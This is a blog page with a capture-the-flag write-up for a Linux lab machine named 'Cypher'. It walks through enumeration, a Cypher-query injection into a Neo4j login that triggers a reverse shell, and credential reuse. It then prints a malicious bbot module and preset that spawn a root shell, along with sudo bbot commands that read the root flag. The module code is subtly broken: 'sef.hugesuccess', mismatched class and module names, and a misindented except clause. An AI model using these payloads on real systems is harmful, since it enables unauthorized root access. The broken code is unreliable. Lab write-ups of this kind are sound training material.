<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Cypher-Linux-Medium | Pwn3d777</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Cypher-Linux-Medium" />
<meta name="author" content="GitHub User" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Cypher" />
<meta property="og:description" content="Cypher" />
<link rel="canonical" href="https://your-site-url/writeups/2025/07/26/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947.html" />
<meta property="og:url" content="https://your-site-url/writeups/2025/07/26/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947.html" />
<meta property="og:site_name" content="Pwn3d777" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-07-26T16:05:57+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Cypher-Linux-Medium" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-26T16:05:57+00:00","datePublished":"2025-07-26T16:05:57+00:00","description":"Cypher","headline":"Cypher-Linux-Medium","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/26/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947.html"},"url":"https://your-site-url/writeups/2025/07/26/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
<div class="post">
  <h1 class="post-title">Cypher-Linux-Medium</h1>
  
  <div class="post-date">
    Published on 26 Jul 2025
    
  </div>
  
  <h1 id="cypher">Cypher</h1>

<h1 id="1-enumeration">1. Enumeration</h1>
<p><br /><br />
Start using nmap to enumerate open tcp ports
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image.png" alt="image.png" />
<br /><br />
A nginx web application running on port 80, looks like a simple web application, there are almost any functionality on here
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_1.png" alt="image.png" />
<br /><br />
We can sign in but we have no credentials yet
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_2.png" alt="image.png" />
<br /><br />
Use wfuzz to discover directories available without authentication, testing is a one that we have not checked
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_3.png" alt="image.png" />
<br /><br />
A jar artifact that seems to be own of this web application
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_4.png" alt="image.png" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
Letâ€™s analyze this .jar file using jd-gui (java-decompiler) this is a custom application <code class="language-plaintext highlighter-rouge">getUrlStatusCode</code> that receives a url to obtain its url status code, now we need a way to call this function and inject this command 
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_5.png" alt="image.png" />
<br /><br />
We havenâ€™t got many options, check if the username in the sign in form is sanitized
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_6.png" alt="image.png" />
<br /><br />
Effectively it is vulnerable, but this is not sql injection, as we can see, some information is disclosed in the error message, it is running neo4j database, and the query is also shown
<br /><br /></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MATCH</span> <span class="p">(</span><span class="n">u</span><span class="o">:</span><span class="n">USER</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="n">SECRET</span><span class="p">]</span><span class="o">-&gt;</span><span class="p">(</span><span class="n">h</span><span class="p">.</span><span class="n">SHA1</span><span class="p">)</span> <span class="n">WHERE</span> <span class="n">u</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="err">'</span><span class="n">username</span><span class="err">'</span> <span class="k">return</span> <span class="n">h</span><span class="p">.</span><span class="n">value</span> <span class="n">as</span> <span class="n">hash</span>
</code></pre></div></div>

<p><br /><br />
The procedure to build a valid cypher injection is:
<br /><br /></p>
<ul>
  <li>We need to close the query as it normally would</li>
  <li>Perform a function call to trigger the command executed in <code class="language-plaintext highlighter-rouge">getUrlStatusCode</code></li>
  <li>We need to be sure, the neo4j engine perform the query correctly without errors, use YIELD to return the status code dicted in the function to the query, then return this value to the query return
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_7.png" alt="image.png" />
<br /><br />
As we can see it is being executed, the only problem is the name of the function, check the class where the function is defined to call it properly
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_8.png" alt="image.png" />
<br /><br />
Now itâ€™s time to inject the reverse shell in the url parameter expected by the function 
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_9.png" alt="image.png" />
<br /><br />
It has run correctly, a shell with neo4j user is returned 
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_10.png" alt="image.png" />
<br /><br />
Moving around, enumerating other users and their directories we found read permissions over a files in graphasm directory with neo4j credentials
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_11.png" alt="image.png" />
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_12.png" alt="image.png" />
<br /><br />
Those creds are being reused to get the user flag
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_13.png" alt="image.png" />
<br /><br />
    <h1 id="3priv-esc">3.Priv esc</h1>
    <p><br /><br />
This user has the ability to run bbot binary as root
<br /><br /></p>
  </li>
</ul>

<aside>
ðŸ’¡

bbot is a scanning tool, used for enumerating and reconnaissance, focusing on OSINT for penetration testing purposes

</aside>

<p><br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_14.png" alt="image.png" />
<br /><br />
Searching on internet there are malicious modules we can use it to spawn a shell as root
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_15.png" alt="image.png" />
<br /><br /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##preset.yml
</span><span class="n">description</span><span class="p">:</span> <span class="n">HAHA</span> <span class="n">PWNED</span>
<span class="n">module_dirs</span><span class="p">:</span>
	<span class="o">-</span><span class="p">.</span>
<span class="n">modules</span><span class="p">:</span>
	<span class="o">-</span><span class="n">systeminfo_enum</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#systeminfo_enum.py
</span><span class="kn">from</span> <span class="nn">bbot.modules.base</span> <span class="kn">import</span> <span class="n">BaseModule</span>
<span class="kn">import</span> <span class="nn">pty</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">class</span> <span class="nc">systeninfo_enum</span><span class="p">(</span><span class="n">BaseModule</span><span class="p">):</span>
	<span class="n">watched_events</span> <span class="o">=</span> <span class="p">[]</span>
	<span class="n">produced_events</span> <span class="o">=</span> <span class="p">[]</span>
	<span class="n">meta</span> <span class="o">=</span> <span class="p">{</span><span class="s">"description"</span><span class="p">:</span><span class="s">"You will be pwned"</span><span class="p">}</span>
	
	<span class="c1">#setup called when the module is initialized
</span>	<span class="k">async</span> <span class="k">def</span> <span class="nf">setup</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="n">sef</span><span class="p">.</span><span class="n">hugesuccess</span><span class="p">(</span><span class="s">"Set-up called - pwned!!@@!"</span><span class="p">)</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">([</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="s">"-p"</span><span class="p">])</span>
			<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s">"Somethin wrong </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
		<span class="k">return</span> <span class="bp">True</span>
		
</code></pre></div></div>

<p><br /><br />
All bbot even modules running as root
<br /><br />
<img src="/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_16.png" alt="image.png" />
<br /><br />
If we only want the flag we can avoid this module method and use the next flags
<br /><br /></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bbot</span> <span class="o">-</span><span class="n">t</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">d</span>
<span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bbot</span> <span class="o">--</span><span class="n">custom</span><span class="o">-</span><span class="n">yara</span><span class="o">-</span><span class="n">rules</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">debug</span>
</code></pre></div></div>

<p><br /><br />
Machine pwned!@!@!!</p>

<script src="/assets/js/matrix-overlay.js"></script>

<link rel="stylesheet" href="/assets/css/imagesstyle.css" />


</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'https://your-site-url/writeups/2025/07/26/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947.html';
     this.page.identifier = '/writeups/2025/07/26/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947';
     this.page.title = 'Cypher-Linux-Medium';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/writeups/2025/08/09/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4.html">
            University-Windows-Insane
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/08/04/d2fd2792-68e0-4168-9904-f90f3bf63609-export-0ee8c1a5-de29-43f8-b0f4-339fa55d28de.html">
            Code-Linux-Easy
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/07/22/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9.html">
            Scepter-Windows-Hard
          </a>
        </h3>
      </li>
    
  </ul>
</div>






<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
